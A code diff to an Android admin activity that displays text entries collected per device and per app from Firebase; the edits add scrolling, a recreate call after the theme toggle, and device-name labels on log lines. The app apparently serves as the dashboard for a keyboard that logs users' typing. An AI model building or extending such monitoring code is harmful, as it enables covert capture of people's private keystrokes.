@@ -2,6 +2,7 @@ package com.example.mykeyboardadmin
 
 import android.graphics.Color
 import android.os.Bundle
+import android.text.method.ScrollingMovementMethod
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
@@ -60,6 +61,8 @@ class AdminMainActivity : AppCompatActivity() {
         txtTotalDevices = findViewById(R.id.txtTotalDevices)
         txtTotalEvents = findViewById(R.id.txtTotalEvents)
         txtGlobalLogConsole = findViewById(R.id.txtGlobalLogConsole)
+        txtGlobalLogConsole.movementMethod = ScrollingMovementMethod()
+
         containerTopApps = findViewById(R.id.containerTopApps)
         btnDarkModeToggle = findViewById(R.id.btnDarkModeToggle)
 
@@ -72,6 +75,7 @@ class AdminMainActivity : AppCompatActivity() {
                 AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
                 btnDarkModeToggle.text = "🌙 Dark"
             }
+            recreate()
         }
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
@@ -202,6 +206,7 @@ class AdminMainActivity : AppCompatActivity() {
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
 
                 for (deviceChild in snapshot.children) {
+                    val deviceName = deviceChild.key ?: "Device"
                     for (appChild in deviceChild.children) {
                         val rawApp = appChild.key ?: continue
                         val prettyApp = getPrettyAppName(rawApp)
@@ -214,7 +219,7 @@ class AdminMainActivity : AppCompatActivity() {
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
                             if (text.isNotBlank() && text != "null") {
-                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
+                                allEntries.add(LogEntry(timestampMillis, "$deviceName: $prettyApp", text))
                                 appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
                             }
                         }
